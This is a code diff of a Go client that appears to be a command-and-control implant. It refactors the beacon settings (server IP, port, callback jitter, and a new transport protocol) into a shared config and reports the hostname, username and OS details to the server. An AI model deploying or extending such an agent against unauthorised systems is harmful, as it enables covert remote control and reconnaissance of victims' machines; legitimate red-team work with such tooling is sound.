@@ -15,21 +15,28 @@ var (
 	CallbackJitter    string
 	RootCert          string
 	LoggingEnabled    string
+	TransportProtocol string
 )
 
 func main() {
-	client_utils.Initialize(LoggingEnabled)
-	config, err := client_utils.LoadCertificate(RootCert)
-	if err != nil {
-		log.Fatalf("Failed to load certificate: %v\n", err)
-	}
+	*client_utils.ClientConfig.ServerIP = ServerIP
+	*client_utils.ClientConfig.ServerPort = ServerPort
+	*client_utils.ClientConfig.CallbackFrequency = CallbackFrequency
+	*client_utils.ClientConfig.CallbackJitter = CallbackJitter
+	*client_utils.ClientConfig.TransportProtocol = TransportProtocol
 
+	client_utils.Initialize(LoggingEnabled)
 	agentID, hostname, username := client_utils.GenerateAgentMetadata()
 	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
 	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()
 
 	for {
-		beacon, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
+		config, err := client_utils.LoadCertificate(RootCert, *client_utils.ClientConfig.TransportProtocol)
+		if err != nil {
+			log.Fatalf("Failed to load certificate: %v\n", err)
+		}
+		logger.Logf(logger.Info, "Creating a beacon using %v:%v/%v", *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
+		beacon, err := client_utils.EstablishConnection(config, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
 		if err != nil {
 			time.Sleep(5 * time.Second)
 			continue
@@ -41,8 +48,11 @@ func main() {
 		err = client_utils.HandleConfigurationRequest(
 			beacon, agentID, hostname, username, ip,
 			osType, osArch, osVersion, cpus, memory,
-			ServerIP, ServerPort, CallbackFrequency, CallbackJitter,
-			nextCallback,
+			*client_utils.ClientConfig.ServerIP,
+			*client_utils.ClientConfig.ServerPort,
+			*client_utils.ClientConfig.CallbackFrequency,
+			*client_utils.ClientConfig.CallbackJitter,
+			nextCallback, *client_utils.ClientConfig.TransportProtocol,
 		)
 		if err != nil {
 			client_utils.HandleError(beacon, "configuration", err)
